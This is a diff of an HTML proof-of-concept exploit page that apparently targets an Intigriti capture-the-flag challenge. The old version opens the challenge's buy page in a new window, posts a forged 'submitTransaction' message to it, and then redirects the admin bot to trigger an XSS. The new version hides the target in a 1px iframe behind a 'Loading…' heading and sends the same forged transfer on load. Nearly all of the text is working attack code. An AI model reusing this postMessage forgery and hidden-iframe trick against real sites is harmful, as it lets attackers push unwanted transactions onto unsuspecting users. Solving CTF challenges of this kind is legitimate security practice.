@@ -1,32 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head><title>Exploit</title></head>
 <body>
-    <script>
-        // 1. Open the Buy page for 1337COIN (The Admin's favorite)
-        const targetUrl = "https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1";
-        const adminWin = window.open(targetUrl);
+<h1>Loading…</h1>
 
-        setTimeout(() => {
-            // 2. Trigger the transaction via the postMessage vulnerability
-            // We use the Admin's details to ensure it bypasses any backend checks
-            adminWin.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: '174094f246eb6712e885d470519c0ad4d4', 
-                    currency: '1337COIN',
-                    amount: 1
-                }
-            }, '*');
+<iframe
+  id="victim"
+  src="https://challenge-0126.intigriti.io/buy-confirm.html?currency=1337COIN&price=1"
+  style="width:1px;height:1px;border:0;"
+></iframe>
 
-            // 3. Keep the Admin on the page long enough for the Polling to hit
-            // The marketplace fetches every few seconds. We redirect them to Marketwatch
-            // to ensure they "see" the transaction and trigger the XSS.
-            setTimeout(() => {
-                adminWin.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
-            }, 4000);
+<script>
+const iframe = document.getElementById("victim");
 
-        }, 5000); // 5s initial load time for the bot
-    </script>
+iframe.onload = () => {
+  iframe.contentWindow.postMessage({
+    type: "submitTransaction",
+    transaction: {
+      toAddress: "174094f246eb6712e885d470519c0ad4d4",
+      currency: "1337COIN",
+      amount: 1
+    }
+  }, "*");
+};
+</script>
 </body>
 </html>
